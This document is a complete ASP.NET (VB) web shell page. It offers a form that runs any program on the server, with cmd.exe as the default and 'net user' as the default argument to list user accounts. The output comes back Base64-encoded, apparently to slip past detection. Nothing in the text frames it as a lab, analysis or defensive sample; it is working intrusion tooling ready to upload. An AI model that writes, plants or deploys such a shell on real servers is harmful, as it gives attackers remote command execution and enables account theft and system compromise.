<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="System.Text" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)            
    ' Create a new Process to run the command
    Dim myProcess As New Process()            
    Dim myProcessStartInfo As New ProcessStartInfo(xpath.Text)            
    myProcessStartInfo.UseShellExecute = False            
    myProcessStartInfo.RedirectStandardOutput = True            
    myProcess.StartInfo = myProcessStartInfo            
    myProcessStartInfo.Arguments = xcmd.Text            
    myProcess.Start()            

    ' Read the output from the process
    Dim myStreamReader As StreamReader = myProcess.StandardOutput            
    Dim myString As String = myStreamReader.ReadToEnd()            
    myProcess.Close()            

    ' Convert the output to Base64 encoding
    Dim bytes As Byte() = Encoding.UTF8.GetBytes(myString)
    Dim base64String As String = Convert.ToBase64String(bytes)

    ' Display the Base64-encoded result
    result.Text = vbCrLf & "<pre>" & base64String & "</pre>"    
End Sub

</script>

<html>
<body>    
<form runat="server">        
    <p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
    <asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
    <p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
    <asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
    <p><asp:Button id="Button" onclick="RunCmd" runat="server" Width="100px" Text="Run"></asp:Button>        
    <p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
